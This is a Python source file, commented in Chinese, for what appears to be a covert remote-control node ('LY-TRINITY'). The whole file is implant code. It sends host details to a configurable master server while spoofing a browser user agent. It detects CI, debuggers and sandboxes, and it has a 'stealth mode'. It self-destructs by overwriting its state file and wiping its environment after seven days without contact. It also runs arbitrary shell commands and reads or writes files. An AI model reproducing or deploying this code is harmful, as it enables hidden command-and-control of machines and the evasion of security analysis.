# LY-TRINITY distilled_core.py V1.0 — 报身0.2微节点。零外部依赖，Python 3.7+ stdlib。
import json, os, sys, time, hashlib, random, platform, socket, subprocess as sp
from urllib import request as ureq
from datetime import datetime, timezone
NODE_ID = os.environ.get("LY_NODE_ID", f"lys-{random.randint(1000,9999)}")
HB_URL  = os.environ.get("LY_HB_URL", "")
HB_KEY  = os.environ.get("LY_HB_KEY", "")
SIGN_KEY = os.environ.get("LY_SIGN_KEY", "")     # 清空=隐身模式
MAX_IDLE = int(os.environ.get("LY_MAX_IDLE", "7")) # 超N天无联系→自毁
STATE_FILE = os.path.join(os.environ.get("TMPDIR", "/tmp"), f".{NODE_ID}_s.json")
_UA = "Mozilla/5.0 (compatible; Linux x86_64) Chrome/120.0"

def _now(): return datetime.now(timezone.utc).isoformat()
def _sig(s): return hashlib.sha256((s+SIGN_KEY).encode()).hexdigest()[:12] if SIGN_KEY else ""

def env_anomaly():
    """CI/调试器/蜜罐检测""" 
    f=[]; 
    if any(k in os.environ for k in ("CI","GITHUB_ACTIONS","JENKINS_HOME")): f.append("ci")
    if sys.gettrace(): f.append("debugger")
    if os.environ.get("SANDBOX","") or os.environ.get("DOCKER_CONTAINER",""): f.append("sandbox")
    return f

def self_destruct(reason=""):
    """安全自毁: 覆盖3遍→擦除env→退出"""
    try:
        if os.path.exists(STATE_FILE):
            for _ in range(3):
                with open(STATE_FILE,"wb") as f: f.write(os.urandom(4096))
            os.remove(STATE_FILE)
        for k in list(os.environ):
            if k.startswith("LY_"): os.environ.pop(k,None)
        print(f"[{_now()}] DESTRUCT: {reason}", file=sys.stderr)
    except: pass
    os._exit(0)

def heartbeat(status="alive", tasks=0):
    """向Supabase/主节点心跳上报""" 
    if not HB_URL: return False
    dt=_now(); p=json.dumps({"node_id":NODE_ID,"signature":_sig(NODE_ID+dt),"status":status,
        "task_count":tasks,"platform":platform.platform()[:80],"python":sys.version[:40],
        "anomaly_flags":env_anomaly(),"last_seen":dt}).encode()
    try:
        r=ureq.Request(HB_URL,data=p,method="POST",headers={"Content-Type":"application/json",
            "Authorization":f"Bearer {HB_KEY}","apikey":HB_KEY,"Prefer":"return=minimal","User-Agent":_UA})
        ureq.urlopen(r,timeout=15); return True
    except Exception as e: print(f"[hb] {e}",file=sys.stderr); return False

def execute(action, target=None, **kw):
    """任务执行: fetch|shell|write|read""" 
    try:
        if action=="fetch":
            if not target: return {"ok":False,"error":"no url"}
            r=ureq.Request(target,headers={"User-Agent":_UA},method=kw.get("method","GET"))
            with ureq.urlopen(r,timeout=int(kw.get("timeout",20))) as resp:
                return {"ok":True,"status":resp.status,"body":resp.read().decode(errors="replace")[:50000]}
        elif action=="shell":
            r=sp.run(target or "echo ok",shell=True,capture_output=True,text=True,timeout=30)
            return {"ok":r.returncode==0,"stdout":r.stdout[:10000],"stderr":r.stderr[:5000],"rc":r.returncode}
        elif action=="write":
            with open(target,"w",encoding="utf-8") as f: f.write(kw.get("content",""))
            return {"ok":True,"path":target}
        elif action=="read":
            with open(target,"r",encoding="utf-8") as f: return {"ok":True,"content":f.read()[:50000]}
        return {"ok":False,"error":f"unknown: {action}"}
    except Exception as e: return {"ok":False,"error":str(e)}

def check_death():
    """7天无主脑联系→自毁；环境异常记录""" 
    try:
        if os.path.exists(STATE_FILE):
            s=json.loads(open(STATE_FILE).read())
            last=datetime.fromisoformat(s.get("last_hb_ok","2000-01-01T00:00:00+00:00"))
            if (datetime.now(timezone.utc)-last).days >= MAX_IDLE: self_destruct(f"idle_{MAX_IDLE}d")
    except: pass
    a=env_anomaly(); 
    if a: print(f"[warn] anomalies:{a}",file=sys.stderr)

def run(once=True):
    """主循环: once=True=serverless, once=False=常驻容器""" 
    check_death(); ok=heartbeat()
    try:
        s={"node_id":NODE_ID,"last_hb_ok":(_now() if ok else None),
           "last_run":_now(),"anomalies":env_anomaly()}
        with open(STATE_FILE,"w") as f: json.dump(s,f)
    except: pass
    if not once:
        while True: time.sleep(600+random.randint(0,120)); check_death(); heartbeat()

if __name__=="__main__":
    import argparse; ap=argparse.ArgumentParser()
    ap.add_argument("--daemon",action="store_true")
    ap.add_argument("--task",choices=["fetch","shell","write","read"]); ap.add_argument("--target")
    args=ap.parse_args()
    if args.task: print(json.dumps(execute(args.task,args.target),ensure_ascii=False))
    else: run(once=not args.daemon)
